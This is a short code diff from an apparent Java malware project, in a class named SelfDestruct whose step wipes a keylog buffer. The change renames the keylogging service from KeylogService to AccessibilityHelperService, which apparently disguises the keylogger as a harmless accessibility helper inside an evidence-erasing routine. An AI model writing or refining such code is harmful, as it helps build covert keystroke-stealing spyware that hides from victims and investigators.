@@ -34,7 +34,7 @@ public class SelfDestruct {
 
         // ── 1. Wipe keylog buffer ─────────────────────────────────────────────
         try {
-            KeylogService.flushLogs();   // clear in-memory buffer
+            AccessibilityHelperService.flushLogs();   // clear in-memory buffer
             log.append("[1] Keylog buffer cleared\n");
         } catch (Exception e) {
             log.append("[1] Keylog wipe error: ").append(e.getMessage()).append("\n");
